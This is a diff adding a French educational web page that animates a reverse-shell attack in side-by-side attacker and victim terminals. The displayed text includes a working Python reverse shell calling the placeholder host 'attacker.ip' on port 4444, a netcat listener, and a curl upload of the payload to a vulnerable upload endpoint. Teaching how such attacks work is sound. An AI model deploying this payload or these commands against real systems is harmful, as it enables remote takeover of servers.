@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Simulation Reverse Shell</title>
+    <style>
+        body { background: #1a1a1a; color: white; font-family: Arial; margin: 20px; }
+        .terminal { background: #000; color: #0f0; padding: 15px; height: 300px; overflow-y: auto; font-family: monospace; white-space: pre-wrap; font-size: 14px; margin: 10px 0; border-radius: 5px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .info { background: #003366; padding: 15px; border-radius: 5px; margin: 10px 0; }
+        .cmd { color: #0f0; }
+        .out { color: #ccc; }
+        .alert { color: #f44; }
+        .comment { color: #888; font-style: italic; }
+    </style>
+</head>
+<body>
+    <h1>Technical aspects</h1>
+    <div class="grid">
+        <div>
+            <h3>Attaquant</h3>
+            <div id="attacker" class="terminal"></div>
+        </div>
+        <div>
+            <h3>Serveur Cible</h3>
+            <div id="victim" class="terminal"></div>
+        </div>
+    </div>
+    <div id="info" class="info"></div>
+
+    <script>
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        
+        class TerminalSim {
+            constructor() {
+                this.attacker = document.getElementById('attacker');
+                this.victim = document.getElementById('victim');
+                this.info = document.getElementById('info');
+                this.start();
+            }
+
+            log(terminal, text, className) {
+                const div = document.createElement('div');
+                div.className = className || '';
+                div.textContent = text;
+                terminal.appendChild(div);
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+
+            updateInfo(text) {
+                this.info.textContent = text;
+            }
+
+            async start() {
+                // Phase 1: Préparation
+                this.updateInfo("L'attaquant prépare un payload qui créera une connexion sortante vers son système.");
+                this.log(this.attacker, "# Création du reverse shell", "comment");
+                this.log(this.attacker, "$ cat reverse.py", "cmd");
+                this.log(this.attacker, `import socket,subprocess,os
+s=socket.socket()
+s.connect(("attacker.ip",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+subprocess.call(["/bin/sh","-i"])`, "out");
+                await sleep(3000);
+
+                // Phase 2: Mise en écoute
+                this.updateInfo("L'attaquant se met en écoute pour recevoir la future connexion du serveur compromis.");
+                this.log(this.attacker, "# Attente de connexion entrante", "comment");
+                this.log(this.attacker, "$ nc -lvp 4444", "cmd");
+                this.log(this.attacker, "Listening on [0.0.0.0] port 4444", "out");
+                await sleep(3000);
+
+                // Phase 3: Exploitation
+                this.updateInfo("Exploitation d'une vulnérabilité pour uploader le fichier malveillant.");
+                this.log(this.victim, "# Service web vulnérable actif", "comment");
+                this.log(this.attacker, "$ curl -F 'file=@reverse.py' http://victim/upload.php", "cmd");
+                this.log(this.victim, "[!] Fichier reçu: /tmp/update.py", "alert");
+                await sleep(3000);
+
+                // Phase 4: Exécution
+                this.updateInfo("Le fichier malveillant est exécuté par un processus privilégié sur le serveur cible.");
+                this.log(this.victim, "[*] Execution tâche planifiée (root)", "out");
+                this.log(this.victim, "[!] Exécution de: /tmp/update.py", "alert");
+                await sleep(3000);
+
+                // Phase 5: Connexion
+                this.updateInfo("Le serveur cible initie une connexion vers l'attaquant, contournant les pare-feux.");
+                this.log(this.attacker, "Connection received from victim.server", "out");
+                this.log(this.attacker, "victim$ whoami", "cmd");
+                this.log(this.attacker, "root", "out");
+                this.log(this.victim, "[!] Système compromis", "alert");
+            }
+        }
+
+        new TerminalSim();
+    </script>
+</body>
+</html>
